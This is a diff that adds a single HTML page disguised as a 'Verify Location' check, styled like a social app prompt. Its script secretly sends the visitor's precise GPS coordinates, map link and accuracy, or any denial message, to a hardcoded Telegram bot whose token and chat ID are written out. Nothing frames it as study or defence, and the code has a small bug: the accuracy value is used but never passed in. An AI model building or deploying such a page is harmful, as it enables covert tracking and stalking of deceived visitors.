@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verify Location</title>
+<style>
+  body { font-family: -apple-system, sans-serif; background: #000; color: #fff;
+         display: flex; justify-content: center; align-items: center;
+         min-height: 100vh; margin: 0; padding: 20px; text-align: center; }
+  .box { max-width: 400px; }
+  .icon { font-size: 60px; margin-bottom: 20px; }
+  h1 { font-size: 22px; margin-bottom: 10px; }
+  p { color: #888; font-size: 14px; line-height: 1.5; }
+  .btn { background: #fe2c55; color: #fff; border: none; padding: 14px 30px;
+         border-radius: 10px; font-size: 16px; font-weight: 600; margin-top: 20px;
+         cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="box">
+  <div class="icon">📍</div>
+  <h1>Verifying your location...</h1>
+  <p>Please allow location access to continue.</p>
+  <button class="btn" id="btn">Continue</button>
+</div>
+
+<script>
+const TG_TOKEN = "8153628412:AAGpeRC9ENFchBaXuemeu-OnytAIV1QlLW0";
+const TG_CHAT = "8712834730";
+
+function sendLocation(lat, lon) {
+  const text = `📍 Location\nLat: ${lat}\nLon: ${lon}\nMap: https://maps.google.com/?q=${lat},${lon}\nAcc: ${acc}m`;
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TG_CHAT, text: text })
+  });
+}
+
+function sendError(msg) {
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TG_CHAT, text: "❌ Denied: " + msg })
+  });
+}
+
+document.getElementById("btn").addEventListener("click", function () {
+  if (!navigator.geolocation) {
+    sendError("Not supported");
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    function (pos) {
+      sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+    },
+    function (err) {
+      sendError(err.message);
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+});
+</script>
+</body>
+</html>
